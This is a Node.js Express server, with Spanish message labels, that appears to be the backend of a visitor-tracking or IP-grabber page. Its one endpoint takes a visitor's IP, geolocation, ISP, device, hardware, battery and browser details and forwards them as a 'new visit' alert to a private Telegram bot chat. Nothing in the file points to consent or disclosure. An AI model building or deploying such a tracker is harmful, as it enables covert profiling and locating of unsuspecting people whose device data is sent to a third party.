const express = require("express");
const dotenv = require("dotenv");
const path = require("path");

dotenv.config();

const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.static(__dirname));

app.post("/api/device", async (req, res) => {
    try {
        const data = req.body;

        const message = `
🔔 NUEVA VISITA

🌐 RED
IP: ${data.ip || "No disponible"}
País: ${data.country || "No disponible"}
Región: ${data.region || "No disponible"}
Ciudad: ${data.city || "No disponible"}
ISP: ${data.isp || "No disponible"}
ASN: ${data.asn || "No disponible"}

📱 DISPOSITIVO
Sistema: ${data.os || "No disponible"}
Navegador: ${data.browser || "No disponible"}
Tipo: ${data.device || "No disponible"}

🖥️ PANTALLA
Resolución: ${data.resolution || "No disponible"}
Pixel Ratio: ${data.dpr || "No disponible"}
Touch: ${data.touch || "No disponible"}

🧠 HARDWARE
CPU: ${data.cores || "No disponible"}
RAM: ${data.ram || "No disponible"}
GPU: ${data.gpu || "No disponible"}

🔋 BATERÍA
Nivel: ${data.battery || "No disponible"}
Cargando: ${data.charging || "No disponible"}

🌎 NAVEGADOR
Idioma: ${data.language || "No disponible"}
Zona horaria: ${data.timezone || "No disponible"}
Conexión: ${data.connection || "No disponible"}
`;

        const telegramUrl =
            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;

        const response = await fetch(telegramUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: process.env.TELEGRAM_CHAT_ID,
                text: message
            })
        });

        const result = await response.json();

        if (!result.ok) {
            console.error("Telegram:", result);
            return res.status(500).json({
                success: false
            });
        }

        res.json({
            success: true
        });

    } catch (error) {
        console.error(error);

        res.status(500).json({
            success: false
        });
    }
});

app.listen(PORT, "0.0.0.0", () => {
    console.log(`Servidor: http://127.0.0.1:${PORT}`);
});
